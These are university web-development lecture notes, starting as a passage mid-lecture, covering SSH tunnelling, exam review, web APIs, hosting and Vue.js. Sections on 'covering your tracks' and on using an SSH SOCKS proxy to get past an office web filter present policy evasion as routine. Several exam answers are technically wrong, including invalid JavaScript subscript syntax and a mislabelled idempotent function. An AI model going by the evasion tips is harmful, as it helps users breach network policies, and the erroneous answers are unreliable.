into channel 80 to talk to the HTTP server, and use port 443 to talk to the
server securely.  The `nslookup` program talks to a DNS server over port 53,
etc.


[Ports on Wikipedia](https://en.wikipedia.org/wiki/Port_(computer_networking))


--------------------------------------------------------------------------------
# SSH tunnels

Another SSH feature is called "tunnels", which are secure channels for other
data apart from the secure shell to flow.  There are many uses for this - I'll
illustrate just a few for you today.

For purposes of today's lecture I'll use the hostname `viking-dyn` as the
SSH server. In all of my examples you may replace that with the hostname of
*your* SSH server.

When dealing with tunnels, we name the two ends of the tunnel **local** and
**remote** from the point of view of the *SSH client*.  Each end of a tunnel is
defined by its *IP address* and its *port number*.  Network traffic is directed
to a port on one machine, flows through the tunnel, and comes out at the other
side.  The traffic will enter from one IP:port and come out with a new IP:port.

Keep these definitions in mind throughout this discussion:

#### Local: the end of the tunnel at the SSH Client (e.g. your laptop)

#### Remote: the end of the tunnel at the SSH Server



## Local port forwarding

This causes a port on your laptop to be connected through a tunnel to a port on
the machine hosting the SSH server.  Traffic from your laptop appears to come
out at the server.


### Use case: Access systems protected behind a firewall

I have a router in my home network.  It has a webpage from which I administer
it.  To prevent hackers from taking over my home network, this admin webpage is
only available from within my home network.  What if I need to fix something on
my home network for my family while I'm here at school?  Do I need to run home
to fix it?

If only I had a way to "bounce" a connection from my laptop here at work
through some device within my home network into my router...

Now, I do have a Raspberry Pi in my house which has an internet-exposed SSH
server.

I'll connect to my Raspberry Pi (named viking-dyn) and command SSH to tunnel
port 9000 on my laptop through the SSH connection into viking-dyn, connecting
the other end of the tunnel to port 80 on my router:

    $ ssh viking-dyn -L9000:router.asus.com:80

The syntax of the -L argument breaks down like this:

    -L local port ':' remote address ':' remote port

So long as this SSH connection is alive, I can go to http://localhost:9000 on
my own laptop and it will go to my router by way of my Raspberry Pi.

The "remote address" is a hostname which is reachable from the SSH Server.
The address 'router.asus.com' is the hostname of my own router from the
point-of-view of my Raspberry Pi.

The connection formed by this command is made from the *perspective of the
remote machine*.  What computer does the name `localhost` refer to?  It depends
on which computer you're on!  I may connect to a service *on* my Raspberry Pi
itself by using "localhost" as the *remote* address.  Here's a coinflip service
I run from my house:

    $ ssh viking-dyn -L9001:localhost:5050
    $ nc localhost 9001


You may forward multiple connections on one command line by repeating -L:

    $ ssh viking-dyn -L9000:router.asus.com:80 \
        -L8000:printer.falor:80 \ 
        -L9001:localhost:5050 


### Adding new tunnels at runtime (Optional)

I've showed how to set up tunnels using command line arguments to the ssh
program. If you're using the OpenSSH client you can add new tunnels without
closing down your SSH process, using the same syntax as the command line
arguments.

To do this I need to tell OpenSSH to *not* pass the next keystrokes I type
through the connection to the remote system. I do this by using the SSH escape
key. By default this key is the tilde `~`

1. Type the SSH *escape* key (tilde) to put the OpenSSH client into command
   line mode SSH only recognizes the escape key if it immediately follows a
   newline. Just to be safe, it's best to hit Enter before typing the escape
   key.

2. Enter 'C' to put OpenSSH into command line mode

3. Enter a command line argument in the prompt just as you would enter it if
   you were invoking the ssh program on the command line

You can use the escape sequence '~?' to cause OpenSSH to print out a help
screen of the available commands.



### Use case: Covering your tracks

I can make it appear to the internet that I'm accessing certain webpages from
my home network instead of USU campus.  The 'remote address' in the -L argument
can be *any* address reachable from my SSH server (in this case, my Raspberry
Pi).

http://checkip.dyndns.org

    $ ssh viking-dyn -L9002:checkip.dyndns.org:80

Now, if I connect to http://localhost:9002 from my laptop, I reach
checkip.dyndns.org having gone through my Raspberry Pi at home.  So far as
dyndns.org can determine, I'm connecting from my house, not from USU campus!

Theoretically, I could use this to tunnel to any website of my choosing; if I
have enough local ports I can map each one to a separate web site and give them
the impression that I'm connecting from my SSH server.

In practicality, systems such as HTTPS with hostname-based certificates make
this brittle.  Moreover, nearly all webpages include resources from lots of
different addresses, and this only lets me tunnel into a few at a time.





## Dynamic port forwarding (Poor man's VPN)

Cause a port on your laptop to forward requests from a web browser through the
SSH Server.

Suppose I work at an office with a web filter which prevents me from visiting
Stack Overflow or other websites because "muh social media and inappropriate
content".

> True story: 
>
> Experts-exchange.com is a site similar in intent to Stack Overflow.  It was
> once hosted on the domain 'expertsexchange.com'.  Our HR department didn't
> approve of employees visiting that site while on the clock.

Perhaps your IT department trusts a creepy Russian antivirus program which
installs its own certificates so they it decrypt my traffic as it moves
through their router.

Or, suppose that you're at McRestaurant using McFree WiFi.  You may not
trust WiFi networks that you don't pay for.  For one thing, it is provided by a
corporation which doesn't regard its customers well enough to feed them real
food.  For another thing, there is a dude sitting across from you with what
appears to be a WiFi Pineapple sticking out of his laptop.

You can use local port forwards to protect traffic on a host-by-host basis, but
it would require you to manually set up lots of port forwards, and you would
still have to remember which port goes with which website.  Any websites which
use absolute URLs will break (this would be almost all of them).

It would be nice if you could tell your browser to bounce *all* of its requests
through the SSH server running on a trusted system, and do all of the work of
keeping everything straight.

OpenSSH has you covered as it provides an interface known as a SOCKS proxy
which scales my tunnels up to a usable level.  It's a bit like using a VPN
connection on an application-by-application basis.

    $ ssh viking-dyn -D12345

Next, configure the web browser on your laptop to use local port 12345 as a
SOCKS proxy.  Each request will securely go through an encrypted tunnel to my
Raspberry Pi and all of my web traffic will appear to originate from my house.
All of it.


### Use case: Test a webservice from many locations

If I ask DuckDuckGo [what is my ip address?](https://duckduckgo.com/?q=what+is+my+ip+address),
it reports that I'm at USU.  What happens when I ask the same question from
another computer?




## Remote port forwarding

Make a port at the server connect to a port on your laptop

Here's the Django server I've been developing on my laptop:

    http://localhost:8000/hello/highFive

Right now, I need somebody to visit that URL and tell me how nice it looks.


Oh, you can't reach my laptop through the domain name `localhost`? Now try

    http://voyager2.bluezone.usu.edu:8000/hello/highFive

How does that look? Impressive?



### Use case: Let a customer test a web site under development on my laptop

Suppose that I'm a freelance webdev hacker working on my client's cool new web
site on my own laptop.  I don't want to give my client full access to my laptop
because I have other stuff on there that's not for them.

Yet, the client demands to know that I'm making progress.  I haven't yet gotten
the kinks all worked out on the testing server.  The app works *great* on my
laptop, but it isn't exactly impressive (or practical) bring my laptop to their
office to show them how awesome it is (maybe they are on the other side of
the country).

Remember that my Raspberry Pi *is* on the internet.  What if I could ask my
client to connect to my Raspberry Pi, and have that connection come directly
into my own laptop.  Now the client can see what I'm working on right now,
without having to physically look over my shoulder.  My private laptop is only
online so long as I keep that SSH connection open, so I can cut it off at will.

For this to work, I must edit my Raspberry Pi's SSH server configuration file
and enable the `GatewayPorts` setting:

    GatewayPorts yes


From the machine *running* Django I issue the command

    $ ssh viking-dyn -R8000:localhost:8000


Now, will someone please visit http://unnovative.net:8000/hello/highFive?


The syntax of the -R command breaks down like this:

    -R remote port ':' local address ':' local port

The 1st number is the port which you may connect over the internet to my
Raspberry Pi.

The "local address" in the middle is the hostname of the machine hosting the
Django server *from the point of view* of the SSH command.  Because the SSH
command is running on the same machine as Django, the correct hostname is
`localhost` which means "this very same machine".

The 3rd number is the port on my laptop which my Django server is listening to
connections on. 



#### ngrok: remote port forwarding as a service

If you don't have your own Raspberry Pi on the internet, you can use a 3rd
party service such as https://ngrok.com/ to do this.

You install a program on your computer which does the SSH connection for you.
On ngrok's end, they give you a nice, memorable domain name which connects back
through your tunnel onto your laptop.


Lecture 25: Module5/Mar_18/notes.md
================================================================

# CS2610 - Mon Mar 18 - Module 5

# Announcements

## Exam #1 in Testing Center this week

The exam is available from Tues 3/19 through Thur 3/21


## Assignment 4 Effort Survey

[Optional Survey about Assn4](https://usu.instructure.com/courses/529849/quizzes/716667/take)

I appreciate any feedback you can offer that helps create make better assignments.



## FSLC - Belated Pi Day celebration

We wanted to share with you some cool projects to do on a Raspberry Pi on Pi
day, but it landed on Spring Break this year.  Better late than never!

Wednesday, March 20th
7pm - ESLC Room 053



----------------------------------------------------------------------------
# Exam 1 Review

* 40 questions in total - 100 points
* 10 review questions from the previous exam
* 30 questions covering material spanning modules 3-5


## Review question topics
* Structure of HTML document
* Inline vs. block elements
* CSS Selectors



## Git

* What does `HEAD` refer to?
    - The currently checked-out commit


* The fundamental unit of history in the git log are ______
    -   commits


* What is the "working tree"?
    - The currently checked-out files/directories that you can see


* Once a tag has been pushed to a remote repo, there is no way to delete it
    - False


* Which git command is used to move between commits?
    - git checkout OBJECT


* Which git command displays the log history beginning at tag `Assn3`?
    - git log Assn3


* Which git command deletes the tag `Assn3` from the remote named "myrepo"?
    - git push myrepo -d Assn3


## CRUD: HTTP + Databases

* What is the Object Relational Mapper (ORM)?
    - A programming API which provides an object-oriented interface to a database.


* List advantages of an ORM over directly accessing a database via SQL.
    - No SQL injections
    - Use familiar OO principles and consistent programming style
    - Avoid subtle differences between database-specific SQL dialects


* When your website is "Statically Hosted", there is no database-driven system
  such as Django providing dynamic content
    - True


* What does CRUD stand for?
    - Create, Read, Update, Delete


* What does it mean for an operation to be safe?
    - It does not modify resources on the server


* Which CRUD operations are safe?
    - Read


* What does it mean for an operation to be idempotent?
    - It does not make a difference to do the operation more than once


* Which of the CRUD operations are idempotent?
    - Read, Update, Delete


* Define a Python function which preforms an idempotent operation
    - def add1(n): return n + 1
    - No matter how many times I call this function, so long as I pass in the
      same value of `n` it continues to give me the same output

For contrast, here is a function which is *not* idempotent:

    n = 0
    def incr():
        global n
        n += 1
        return n

The final result in `n` depends upon how many times I call this function.


* The <form> element may contain only input widgets; other child elements are not allowed
    - False: <form> may contain any elements that a <div> may contain


* What does the *method* attribute on the <form> element mean?
    - Which type of HTTP request the client should use to send data
      (e.g. GET, POST, PUT, etc.)


* What does the *action* attribute on the <form> element mean?
    - Where the data is to be sent


* What is the difference between the "id" and "name" attributes on an <input> element?
    - "id" is used to locate the <input> element in the HTML tree
    - "name" is sent along with the value back to the server


* After successfully handling a POST request, why is it best-practice to redirect the user to another URL?
    - To prevent accidental re-submission


* Where is the data "payload" of a GET request located?
    - In the URL


* Where is the data "payload" of a POST request located?
    - In the body of the request


## JavaScript Objects

* The names of properties in a JavaScript Object may contain special characters
  such as spaces and operators
  - True; in this case they must be quoted and applied using *subscript* syntax.  For example:

    o.['hello'] = 'World';
    o.hello = 'World';
    o.['Is this a valid property? Yes!'] = 1;


* How many properties does the JavaScript object `o` possess?
    - 3: 'Frank' is duplicated here, but exists only once in the object `o`

    var o = {
        'Frank': 0,
        'Colton': 0,
        'Gabriela': 0
        'Frank': 0
    };


* How many properties does the JavaScript object `p` possess?
    - 4; properties contained within sub-objects don't count for `p`

    var p = {
        'Preston': [1, 2, 3, 4],
        'Cayden': { 
            'undeclared': 'hey',
            'sighted': 'hey hey',
            'minority': 'hey hey hey',
        },
        'Peter': 'pan',
        'Delaney': {
            'shade': 1,
            'wonder':2,
            'bathe': 3,
        },
    };



## JavaScript + DOM

* How does one create a DOM node from scratch?
    - document.createElement()


* How does one set an attribute on a DOM node?
    - ele.setAttribute('attr', 'value')


* How does one add a DOM node to the tree?
    - ele.appendChild()


* How does one remove a DOM node from the tree?
    - ele.removeChild()
    - ele.remove()


* How does one evaluate JavaScript expressions in the browser?
    1. Open the Inspector
    2. Go to the `Console` tab
    3. Type away


* How does one print a message to the browser's debug console?
    - console.log()


* How does one pop up a modal message window in the browser?
    - alert()



## DNS + SSH

* Communication between two computers across a network requires which two pieces of information
    - IP address
    - Port number


* What does 'DNS' stand for?
    - Domain Name System


* The Domain Name System (DNS) is essentially
    - A database mapping hostnames to IP addresses


* Explain whether or not this is a true statement: *"If you control the DNS,
  you can control which websites users can visit."*
    - This is true if users don't already know the IP address of a site


* Which task is the Secure Shell (SSH) primarily concerned with?
    - Remote web server administration


* SSH replaced older protocols such as Telnet and rsh because
	- SSH encrypts traffic between the client and the server


* SSH's SOCKS proxy feature is a quick, handy replacement for
	- A Virtual Private Network (VPN)


* You might use SSH's Remote Port Forwarding to do what?
    - Enable a remote user to access a service running on your private laptop


Lecture 26: Module5/Mar_20/notes.md
================================================================

# CS2610 - Wed Mar 20 - Module 5

# Announcements

## FSLC - Belated Pi Day celebration

We wanted to share with you some cool projects to do on a Raspberry Pi on Pi
day, but it landed on Spring Break this year.  Better late than never!

Wednesday, March 20th
7pm - ESLC Room 053



# Topics:

* Assignment #5: Worth Your Weight In Gold (Web 2.0)
* Web Application Programming Interfaces (Web APIs)



----------------------------------------------------------------------------
# Assignment #5: Worth Your Weight In Gold (Web 2.0)

https://usu.instructure.com/courses/529849/assignments/2581304

Key points
----------

* Your project will combine Django and JavaScript code.  Your JavaScript code
  may be embedded within your HTML templates in script elements, or may be
  served by Django as static files

* Your project *must* consist of two Django apps: one providing the User
  Interface, and one providing a web API.

* Your webpage needs to fetch data from your web API *and* from a 3rd party
  API.  Don't fetch this data from the Django server-side; the fetch *must*
  happen on the client-side.

* The Django app providing the web API *must* use a Model to store the unit
  conversion values.  It is okay to use a dictionary while you're developing
  it, but the unit conversion data *must* ultimately come from a database.



<Demonstrate the app>



----------------------------------------------------------------------------
# Web Application Programming Interfaces (Web APIs)

## Mud card questions

* What is an Application Programming Interface (API)?

* How does API relate to our role as software creators?

* What are examples of APIs you've used before?


[Module 5 R&R](../Readings-and-resources.md)


### Some APIs to try out

#### Lorem Ipsum generator

https://loripsum.net/

    $ curl https://loripsum.net/api/
    $ curl https://loripsum.net/api/5/long
    $ curl https://loripsum.net/api/5/long/allcaps
    $ curl https://loripsum.net/api/5/long/allcaps/plaintext


#### Dad jokes

    $ curl -H "Accept: application/json" https://icanhazdadjoke.com/
    $ curl -H "Accept: text/plain" https://icanhazdadjoke.com/


#### RoboHash Image Generator

    https://robohash.org/erik-falor.png
    https://robohash.org/erik.falor.png


#### MusicBrainz API

https://musicbrainz.org/doc/Development/XML_Web_Service/Version_2

    $ curl -A "cs2610 (erik.falor@usu.edu)" "https://musicbrainz.org/ws/2/recording?fmt=json&limit=3&query=waking+season" | python -m json.tool
    $ curl -A "cs2610 (erik.falor@usu.edu)" "https://musicbrainz.org/ws/2/artist?fmt=json&limit=3&query=the+appleseed+cast" | python -m json.tool
    $ curl -A "cs2610 (erik.falor@usu.edu)" "https://musicbrainz.org/ws/2/artist?fmt=json&limit=3&query=the+appleseed+cast" | python -m json.tool


#### The Internet Archive Wayback Machine

* [Checking for a snapshot](https://archive.readme.io/docs/website-snapshots)

    $ curl "https://archive.org/wayback/available?url=spacejam.com"


* [Making a snapshot](https://archive.readme.io/docs/creating-a-snapshot)

    $ curl -X POST -H "Content-Type: application/json" -d '{"url": "pokemon.com"}' https://pragma.archivelab.org


Lecture 27: Module5/Mar_22/notes.md
================================================================

# CS2610 - Fri Mar 22 - Module 5

# Announcements

## Due dates for remaining assignments changed

Of particular interest to you is the fact that the due date of Assn5 has been
pushed back by one week.  It is now due on April 3rd.

# Topics:
* Exam #1 Recap
* Arrow functions
* Promises and the Fetch API
* Using the JSON object resulting from `fetch()`




----------------------------------------------------------------------------
# Exam #1 Recap


__Question 3__ (68% answered correctly)
* Q:    <p> is an inline element
* A:    False!


__Question 5__ (79% answered correctly)
* Q:    Inline elements, by default, take up the entire width of the page
* A:    False!


__Question 9__ (23% answered correctly)

* Q:    What will the selector `body div p` select?
* A:    only paragraphs within a <div> which is within a <body>

`body div p` is an example of a *composite selector* which will select the
paragraph in this example: 

    <body>
        <main>
            <article>
                <div>
                    <ul>
                        <li>
                            <p>


`body > div > p` is an example of a *composite selector* which will select the
paragraph in this example: 

    <body>
        <div>
            <p>


See the lecture notes from Fri. Jan 18, and the Exam #0 recap from Friday, Feb 8.
This was Question #22 from Exam #0 where 66% of you answered it correctly.


__Question 31__ (53% answered correctly)

* Q:    What is the purpose of the <form> element's `action` attribute?
* A:    Specifies where to send the form-data upon submission




----------------------------------------------------------------------------
# Arrow functions
# Promises and the Fetch API
# Using the JSON object resulting from `fetch()`

See Readings-and-resources.md for Module 5.


Lecture 28: Module5/Mar_25/notes.md
================================================================

# CS2610 - Mon Mar 25 - Module 5

# Announcements

## FSLC

Cal Coopmans AggieAir

Wednesday March 27
7pm ESLC 053


# `fetch()` and `Promise` syntax revisited

Let's take another look at the code we wrote last Friday to compare the
unfamiliar `fetch()` and `.then()` syntax with the naïve approach a beginner
might take to write it.  I've written that example in two styles, which I
invite you to experiment with:

[A very fetching example](fetch/quandl.js)


Lecture 29: Module5/Mar_27/notes.md
================================================================

# CS2610 - Wed Mar 27 - Module 5

# Announcements

## FSLC

Cal Coopmans of AggieAir

Wednesday, March 27th
7pm - ESLC Room 053




## Utah OpenSource Intercollegiate Cyber Sparring Event

Practice your CyberSec skills in a friendly environment.

Saturday, Mar 30 12pm through 6pm
ESLC 053

You'll need to install a piece of VPN software called
[ZeroTierOne](https://www.zerotier.com/download.shtml) to connect to the Utah
OpenSource VPN to play.

On ZeroTierOne's homepage you may see an insane command line which installs
their software.  Don't do it.  [Whoever puts instructions like this on their
website needs to be drug out into the street and
shot](https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/).
Just download the installer for your OS and install it like a normal person.


After ZeroTierOne is installed, launch the zerotier-one service

    $ zerotier-one -d

Next, join a ZeroTier network, and wait for your new IP address.  The
hexadecimal number is the ID of the UTOS cybersecurity sparring network:

    $ zerotier-cli join a0cbf4b62a48c5f9




## Computer Science Department Spring Social and Awards Dinner

April 16, 2019
5 – 7 pm
Haight Alumni Center, USU Campus

* Free Dinner - Taco Bar & Drinks from The Italian Place
* Prizes
* RSVP is required. RSVP to cora.price@usu.edu number of adults & kiddos, & dietary notes



# Topics:
* Write a Django App which provides an API
* REST: Representational state transfer

----------------------------------------------------------------------------
# Write a Django App which provides an API

Let's write an API endpoint in Django which takes a GET request and computes a
Fibonacci number requested in the `n` GET parameter.


## Mud card Activity

Before we begin writing code, let's take a few minutes to design it.
On your mud card, sketch what you think this view function will look like:

- What are your inputs?
- What is your output?
- What error conditions must you be prepared for?
- What helper functions will you need?


Here's the outline I came up with:

* Hook our view up in fib/urls.py
* Get input from request.GET
    - Loop over GET variables and print them out
* Write the fibonacci(n) helper function
* Create a dictionary to send as a response
    - Respond to a valid request with the user's requested data
    - Respond to an invalid request with a helpful error message
* Return a JsonResponse object
    - Convert our dictionary into JSON
    - `from django.http import JsonResponse`


As we write this code, jot any questions you have for me on your mud card.


## The finished product

Find the code in https://bitbucket.org/erikfalor/sp19-cs2610-djangoproj/src/master/



----------------------------------------------------------------------------
# REST: Representational state transfer

[REST on Wikipedia](https://en.wikipedia.org/wiki/Representational_state_transfer)

REST is an architectural style that defines a set of constraints to be used for
creating web services.  Web services confirming to the REST style are said to
be "RESTful".  RESTful web services are characterized by supporting stateless
operations.

The unit conversion API you're writing for Assignment 5 is an example of a
RESTful API.

"State" in this context refers to any information about requests which exists
between requests.  This data may be stored in a database (e.g. account
information), maintained as global variables in the server (ick!), or stored on
the client side (e.g. Cookies).

Being stateless just follows from being delivered over HTTP, which is itself a
stateless protocol.  Stateless means that each request stands alone, and no
information about the client is stored on the server.  This property enables
RESTful services to be spread across many different machines, providing
horizontal scalability.

It's not possible or desirable to always REST to its logical conclusion.  If
Canvas were stateless, you'd have to authenticate every time the browser made a
request.  This means that you'd have to re-log in each time you clicked a link,
and you'd need to give your credentials every time Canvas executed a `fetch()`
on your behalf.


Lecture 30: Module5/Mar_29/notes.md
================================================================

# CS2610 - Fri Mar 29 - Module 5

# Topics
* Mud Card Review
* Hosting a website with an external hosting provider
* File Transfer Protocol (FTP)



--------------------------------------------------------------------------------
# Mud Card Review

## JavaScript and the future

> Have we switched from JavaScript completely?

1. In this class?  No, we'll be using JavaScript through the end of the semester.

2. As an industry?  No, we rely on JavaScript more than ever.  Despite the
   popularity of Web APIs which enable us to distribute work across the net,
   the importance of server-side computational resources has been diminished
   since the early days of the web.  Back then 100% of computation took place
   on a server.  Now we are able to do much more on the client-side, though
   servers are still of vital importance.

3. As a language?  Not really, and I don't think that we ever will.  JavaScript
   has reached such a high degree of mind-share that I doubt it'll ever be
   replaced.  Too many people love it as a language.  It is the **C** of the
   new millennium.  While there are "new" client-side languages (e.g.
   TypeScript, CoffeeScript, Elm), these are ultimately transformed into
   JavaScript before the browser can run them.  My prediction is that
   WebAssembly will supplement, but not completely replace JavaScript.


## Making Recursive Fibonacci efficient

> Can you easily store values of Fibonacci to allow the recursion to go even
> further without using massive amounts of memory?

Yes you can.  This technique is called [memoization](https://en.wikipedia.org/wiki/Memoization)

Here is a simple implementation which uses a dictionary to cache values of
previous calls to `fibonacci()`.  Notice how this cache is pre-populated with
the base-case values, simplifying our code at the expense of an icky global
variable:

    fib_memo = { 0: 0, 1: 1 }
    def fibonacci(n):
        if n not in fib_memo:
            fib_memo[n] = fibonacci(n-1) + fibonacci(n-2)
        return fib_memo[n]


There are more sophisticated ways of doing this.  You can read more here:
[Memoization + Python on SO](https://stackoverflow.com/questions/1988804/what-is-memoization-and-how-can-i-use-it-in-python)



--------------------------------------------------------------------------------
# Hosting a website with an external hosting provider

So far in this class we've hosted static websites on Bitbucket and have run a
development web server on our own computers.  Today we'll look at how to set up
a website with a dedicated hosting service.


## 0. Choose a hosting provider

The zeroth thing to do is to pick a company to host your website.  Things to
consider are:

* What technology do they support?
    - If you want to host a static webpage or a webpage written in PHP, you'll
      have plenty of options.
    - If you want a place to host your class projects written in Django, you'll
      need to do some research to find a good home for your code.

* Cost:  How much are you willing to pay to host your site?
    - Is a domain name included in the package?
    - How much storage do you get?
    - How much bandwidth are you allowed to use per month?
    - What happens when you exceed the bandwidth limit?
    - Is there a CPU limit?

* Service:  When something goes wrong, how responsive will they be?
    - Do you get an email account for your site?
    - Are backups included?
    - What if you get hacked?  Do they help you fix that, or are you on your
      own?
    - How long of a contract are you entering into?


Once you choose a hosting company you buy a hosting package with the level of
service you need for this site.

Today I'll show you what this looks like with WestHost.  WestHost is a local
web hosting company who was kind enough to provide a free hosting package to
our class for this demo.  WestHost is a PHP shop, so I'll only be able to show
you static pages today.


Today's website is found at `http://aggies.us`

* [My awesome site at http://aggies.us](http://aggies.us)

Your hosting package with the hosting company will often include a web-based
interface to control your website.  This is how muggles are able do get things
online despite being quite unaware of our wizardry.  WestHost provides a common
control panel called **cPanel**.

* [My WestHost control panel](https://chi.westhost.com)


### Things you are able to do from cPanel

-   Manage files on the server
-   Backup and restore files
-   Manage the databases used by my PHP web apps
-   Analyze website metrics
-   Install common web apps and libraries in Softaculous
-   Create a quick and easy webpage from a template
-   Download access logs


## 1. Get a domain name

Sometimes a domain name is included in the hosting package you purchase.

If you purchase a domain name through your hosting provider, they'll create the
DNS records to point at the web server you're buying from them.  Easy-peasy.
This is how I got a webpage up and running at http://aggies.us.  I spoke with a
nice person at WestHost, told her the name I wanted for my website, and voila.
So easy a muggle can do it.

Alternatively, you can bring your own hostname with you.  Earlier in the
semester we registered a domain name on www.dot.tk.  Let's see if the domain
name **fadein.tk** is available and make it point to my website hosted on
WestHost's servers.


### Register the domain **fadein.tk**

* Login to https://my.freenom.com
* Choose a domain name **fadein.tk**
* Use Freenom's DNS, point the A records to the same IP address as **aggies.us**
* Play the waiting game.  After about 3 minutes fadein.tk should resolve.

    nslookup fadein.tk                 # USU's default DNS
    nslookup fadein.tk 80.80.80.80     # Freenom DNS
    nslookup fadein.tk 208.67.220.220  # OpenDNS


What happens if I try to visit my new website **fadein.tk** in its current state?

I'm sharing this server with other customers. By accessing the real IP address
I haven't given WestHost enough information to know which website to call up.

Do you remember when we talked about HTTP headers?  When I go to a website, one
of the things the browser tells the server is which Hostname I think I'm
talking to with the `Host` header.  This enables one HTTP server to serve many
different websites.  Since I'm not paying for my own personal *dedicated*
server, I'm sharing one machine with one IP address with other cheapskates.

This server does not know who's webpage to serve up when it gets requests with
`Host: fadein.tk`, so I'll need to arrange things such that WestHost recognizes
**fadein.tk** as belonging to my account.


### Connecting fadein.tk to my WestHost service

1. Login to https://chi.westhost.com
2. Open cPanel -> Domains -> Domains
3. Click the button "Create a New Domain"
4. Enter the name **fadein.tk** and click *Submit*

Now when my browser visits `http://fadein.tk` I am greeted with my simple
landing page.  How boring.


## 2. Create some interesting content

We've talked about using SSH for website administration before.  Let's use it
to put custom HTML on this server.

SSH access is not enabled by default by WestHost.  I had to speak to a
representative to enable it.  YMMV.

The files comprising my website are in a directory called `public_html`.
Let's go in there and see what we can do from the command line.



--------------------------------------------------------------------------------
# File Transfer Protocol (FTP)

What if I want to do more than just edit an HTML file from within a terminal?
Suppose I want to put my Fibonacci Tree here - a site in three files.  There's
got to be a better way to move files in bulk, right?

* [FTP on Wikipedia](https://en.wikipedia.org/wiki/File_Transfer_Protocol)

> The File Transfer Protocol (FTP) is a standard network protocol used for the
> transfer of computer files between a client and server on a computer network.
>
> FTP is built on a client-server model architecture using separate control and
> data connections between the client and the server.

FTP is a *very* old protocol.  It has been working over TCP/IP networks since
before I was born, and was invented about 10 years before *that*.

Like HTTP, FTP reports status using three-digit status codes such as the following:

| Code | Human-friendly Message
|------|-----------------------
| 230  | User logged in, proceed. Logged out if appropriate
| 331  | User name okay, need password
| 430  | Invalid username or password
| 501  | Syntax error in parameters or arguments


FTP does have a few odd quirks.

* FTP uses *two* TCP ports per connection.  Port 21 is used to send commands
  and responses back and forth.  Port 20 is used to send file data.  This means
  that while bulk data is being transferred the server and client have a free
  channel of communication.

* FTP distinguishes between *binary* and *ASCII* data.  The distinction is
  important when sending text files between Unix and Windows systems as the
  correct End-Of-Line character is applied on the receiving end (e.g. "\n" in
  Unix text files are converted into "\r\n" for Windows).  Other text data
  conversions may be applied as well, which will corrupt binary data.


While many web browsers can access FTP servers, most of them only support
*downloading* from FTP servers.  We need to *upload* files.  To do this we'll
need an FTP client.


### [Filezilla](https://filezilla-project.org/)

Filezilla is a graphical FTP client.  Once logged in to ftp://aggies.us, it
displays local files on my laptop on the left and remote files on the right.
To transfer files in either direction, I simply navigate the file structure and
drag them to their destination.

Through an FTP client I can do nearly any file-manipulation task that I could
do from a familiar File Explorer, including deleting, renaming, copying and
moving remote files.  Filezilla even lets me edit a remote file using a local
editor.  When I close the file on my computer, Filezilla re-uploads it to the
server!


Lecture 31: Module6/Apr_01/notes.md
================================================================

# CS2610 - Mon Apr 01 - Module 5

# Announcements

## IDEA Surveys - Rare Extra Credit Opportunity

The regular three week long window for IDEA Student Rating of Instruction (SRI)
opens next week.  You should have already received a personalized email with a
link to complete your survey.

Your IDEA feedback is very important to me, and each semester I take many
useful suggestions and incorporate them into my future courses.  Much of what I
do I owe to your suggestions.  The more input I get from you the better I am
able to improve as an instructor.  My goal is to reach 80% participation.

To that end I am offering 25 points of sweet, sweet *extra credit* for your
response.  Your responses remain anonymous, and I will not even see them until
after finals week.  The extra credit is automatically applied to your grade by
Canvas within 48 hours of your taking the anonymous survey.



## SDL/USU Technical Lecture 
Please join us for the next SDL/USU Technical Lecture Series at 4:30 pm on
Tuesday, April 2 in ENGR 201. SDL Mechanical Designer Greg Hopkins will cover
design principles of mechanical components used in space.

Free pizza after the lecture. More information about this exciting event is
available on [our website](https://engineering.usu.edu/events/sdl-usu-lecture-series).
See you there!




## DC435 - NMAP 101 by @Santiago

One of the easiest ways an attacker can discover vulnerabilities on your
network is by doing what is called a port scan. Come learn how to do a port
scan and/or a little more.

Thursday, April 4th @ 7pm
Bridgerland Main Campus - 1301 North 600 West - Room 840



## Class Cancelled next Friday, Apr 12 for OpenWest conference



# Topics:
* The Vue.js Front-end Framework
* How to "install" Vue into your webpage


--------------------------------------------------------------------------------
# [The Vue.js Front-end Framework](../Readings-and-resources.md)

> Vue (pronounced /vjuː/, like view) is a progressive framework for building
> user interfaces.  Unlike other monolithic frameworks, Vue is designed from
> the ground up to be incrementally adoptable. The core library is focused on
> the view layer only, and is easy to pick up and integrate with other
> libraries or existing projects.  On the other hand, Vue is also perfectly
> capable of powering sophisticated Single-Page Applications when used in
> combination with modern tooling and supporting libraries.


#### Front-end Framework

Pertaining to the web client


#### Progressive Framework

Use as much or as little as you need right now; you can go deeper later on as needed.


#### Monolithic Framework

Use the entire thing or don't use it at all.  Does not play well with others. 


Vue is an alternative to bigger frameworks such as React or Angular.  I chose
it for this class because it is simpler to introduce in a short time frame, and
you don't need a broad foundation in many other concepts to be able to use it.


--------------------------------------------------------------------------------
# How to "install" Vue into your webpage

## Link to the latest version of Vue.js

Use this URL in a `script` element: https://cdn.jsdelivr.net/npm/vue


## Link to a specific version of Vue.js

Include the version number of Vue, like this: https://cdn.jsdelivr.net/npm/vue@2.6.10/dist/vue.js




--------------------------------------------------------------------------------
# Vue Templates

* [Declarative Rendering](https://vuejs.org/v2/guide/#Declarative-Rendering)

* [Template Syntax](https://vuejs.org/v2/guide/syntax.html)

Like Django, you can use the tokens `{{` `}}` to create template-like constructs which are filled in by the Vue app.



--------------------------------------------------------------------------------
# Choosing what gets rendered in a template

* [Conditional Rendering](https://vuejs.org/v2/guide/conditional.html)


Lecture 32: Module6/Apr_03/notes.md
================================================================

# CS2610 - Wed Apr 03 - Module 6

# Announcements

## FSLC
Wednesday, April 3rd
7pm - ESLC Room 053

Building robots isn't easy, but thanks to open source software like ROS (Robot
Operating System), it's a bit less hard than it could be.  Come learn how FOSS +
Linux can help you build your first robot.



## DC435 - NMAP 101 by @Santiago
Thursday, April 4th @ 7pm
Bridgerland Main Campus - 1301 North 600 West - Room 840

One of the easiest ways an attacker can discover vulnerabilities on your
network is by doing what is called a port scan. Come learn how to do a port
scan and/or a little more.



## Class Cancelled next Friday, Apr 12 for OpenWest conference



# Topics
* Special Guest Andrew Jouffray: Alexa Skills, APIs and JSON 
* Interactivity and Vue
* Lifecycle hooks: Arrange to fetch data from an API at the right time



----------------------------------------------------------------------------
# Special Guest Andrew Jouffray: Alexa Skills, APIs and JSON 

Andrew has been working on a project to connect an Echo Dot, Amazon's Alexa
service, and the Crestron classroom automation into a unified voice-controlled
system.

All of it is controlled through APIs which pass JSON data back and forth; the
same JSON that you're becoming conversant with.

See attached files

